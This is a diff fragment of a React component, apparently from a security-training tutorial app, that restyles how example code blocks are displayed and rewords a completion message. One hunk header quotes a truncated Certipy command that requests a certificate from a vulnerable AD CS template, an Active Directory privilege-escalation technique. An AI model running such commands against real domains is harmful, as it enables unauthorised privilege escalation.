                           <Code className="h-4 w-4 text-example-border" />
-                          <h5 className="font-semibold text-example-text text-sm">{section.example.title}</h5>
+                          <h5 className="font-semibold text-example-text text-xs">{section.example.title}</h5>
                         </div>
                         {section.example.description && (
-                          <p className="text-xs text-example-text/80 leading-relaxed">
+                          <p className="text-xs text-example-text/70 mt-1 ml-6">
                             {section.example.description}
                           </p>
                         )}
                       </div>
                       <div className="relative">
-                        <div className="absolute top-3 right-3 z-10">
-                          <Badge variant="secondary" className="text-xs font-mono bg-background/80 backdrop-blur">
+                        <div className="absolute top-2 right-2 z-10">
+                          <Badge variant="secondary" className="text-[10px] font-mono bg-background/80 backdrop-blur px-1.5 py-0.5">
                             {section.example.language || "c"}
                           </Badge>
                         </div>
-                        <pre className="bg-code-bg p-5 rounded-b-lg overflow-x-auto text-xs border border-example-border border-t-0">
-                          <code className="text-foreground/90 font-mono whitespace-pre leading-relaxed">
+                        <pre className="bg-code-bg p-4 rounded-b-lg overflow-x-auto text-xs border border-example-border/50 border-t-0 max-h-80">
+                          <code className="text-foreground/90 font-mono whitespace-pre leading-relaxed text-[11px]">
                             {section.example.code}
                           </code>
                         </pre>
                       </div>
-                    </div>
-                  )}
-
-                  {/* Regular Code Block (without example wrapper) */}
-                  {section.code && !section.example && (
-                    <div className="ml-11 relative">
-                      <div className="absolute top-3 right-3 z-10">
-                        <Badge variant="secondary" className="text-xs font-mono bg-background/80 backdrop-blur">
-                          {section.language || "c"}
-                        </Badge>
-                      </div>
-                      <pre className="bg-code-bg p-5 rounded-lg overflow-x-auto text-xs border border-border/50">
-                        <code className="text-foreground/90 font-mono whitespace-pre leading-relaxed">
-                          {section.code}
-                        </code>
-                      </pre>
                     </div>
                   )}
                 </>
@@ -1654,11 +2479,11 @@ certipy req -u user@corp.local -p password -ca corp-CA -target CA01 -template Vu
             </div>
           ))}
 
-          {/* Progress Indicator */}
+          {/* Completion */}
           <div className="flex items-center justify-center gap-2 pt-4 border-t border-border/30">
             <CheckCircle2 className="h-4 w-4 text-success" />
             <p className="text-xs text-muted-foreground">
-              You've completed this section! Try the code examples in the editor →
+              Section complete - try the code in the editor
             </p>
           </div>
         </div>
